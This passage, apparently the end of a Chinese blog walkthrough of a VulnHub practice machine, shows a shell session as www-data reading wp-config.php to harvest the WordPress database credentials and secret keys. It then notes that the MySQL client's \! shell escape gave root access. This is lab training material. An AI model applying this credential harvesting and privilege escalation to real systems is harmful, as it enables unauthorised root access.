<p>密码再wordpress搭建网站的配置文件中有：</p>
<pre class=" language-php"><code class="language-php">www<span class="token operator">-</span>data@wp<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>html<span class="token operator">/</span>wordpress$ cat wp<span class="token operator">-</span>config<span class="token punctuation">.</span>php
cat wp<span class="token operator">-</span>config<span class="token punctuation">.</span>php
<span class="token delimiter">&lt;?php</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_NAME'</span><span class="token punctuation">,</span> <span class="token string">'wordpress'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string">'Wp_Admin#123'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_HOST'</span><span class="token punctuation">,</span> <span class="token string">'localhost'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_CHARSET'</span><span class="token punctuation">,</span> <span class="token string">'utf8mb4'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_COLLATE'</span><span class="token punctuation">,</span> <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'AUTH_KEY'</span><span class="token punctuation">,</span>         <span class="token string">'-=&lt;%h-&amp;zmo1#bWHqHEib?bJt!)mOL7E+j{x7x;Hsc}t?xm?=kRfunrRmTUP;#8OS'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_KEY'</span><span class="token punctuation">,</span>  <span class="token string">'A5#uw+^B_f:K]WNq@aoXLpD@bmMD/hev^UAf,^lTCX3@a1&amp;7A(qLFS_{I=pYw(ET'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_KEY'</span><span class="token punctuation">,</span>    <span class="token string">'~*TFb3]y1^|G9j%?Z@F[63A+AAT&lt;mndFo-H{q0P#Nz/qYN3da@UXyY6YP6`7QNmy'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'NONCE_KEY'</span><span class="token punctuation">,</span>        <span class="token string">'bP88&lt;WoD?9;eN0yM9A{+])!$(k[zp{:-.ZS6Fk*snlJN&amp;GXU6Zy_)wEbqk>-? nn'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'AUTH_SALT'</span><span class="token punctuation">,</span>        <span class="token string">'SX%VenTL%k&amp;f%i8tFAhtf#svIc|nt.&amp;t~R%zp=:n:Q%e0Ux?k,-j?ZAjZZ%;w1ih'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_SALT'</span><span class="token punctuation">,</span> <span class="token string">'-e Z&lt;w&lt;q8F~Tm7IeNu2nSa^or=*B?bV*yRBa+4; My}cIJ]?L%j14RWghI,D^M^5'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_SALT'</span><span class="token punctuation">,</span>   <span class="token string">'}Z}fYC%Mv;;ON/h~$c2c,u[FZ>`YaiscN6UY&amp;HCcXUVl{miUbX4a/ LdJ^AoL/Z{'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'NONCE_SALT'</span><span class="token punctuation">,</span>       <span class="token string">'BQPaC,#p}PEcU^eC*Hwss>9~UCEKhv]tox~PN)?B.kSn%tC)V~pZ6RpOBR>80o5+'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$table_prefix</span> <span class="token operator">=</span> <span class="token string">'wp_'</span><span class="token punctuation">;</span>

<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'WP_DEBUG'</span><span class="token punctuation">,</span> <span class="token boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">defined</span><span class="token punctuation">(</span> <span class="token string">'ABSPATH'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'ABSPATH'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">require_once</span> <span class="token constant">ABSPATH</span> <span class="token punctuation">.</span> <span class="token string">'wp-settings.php'</span><span class="token punctuation">;</span>
</code></pre>
<p>这里数据库登录成功，利用<code>\!</code>​执行命令</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925103518-xejdo7x.png" alt="image">​</p>
<p>成功提权至root权限</p>
<p>‍</p>
<!-- flag of hidden posts -->
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/categories/">分类</a></li>
        
          <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%91%A8"><span class="toc-number">1.</span> <span class="toc-text">第四周</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.2.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.2.</span> <span class="toc-text">mysql提权</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&text=vulnhub4"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&is_video=false&description=vulnhub4"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=vulnhub4&body=Check out this article: https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&name=vulnhub4&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&t=vulnhub4"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2024
    清风
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
      --><li><a href="/">首页</a></li><!--
    --><!--
      --><li><a href="/about/">关于</a></li><!--
    --><!--
      --><li><a href="/archives/">归档</a></li><!--
    --><!--
      --><li><a href="/categories/">分类</a></li><!--
    --><!--
      --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
    -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'qing3feng/qingfengComments';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>
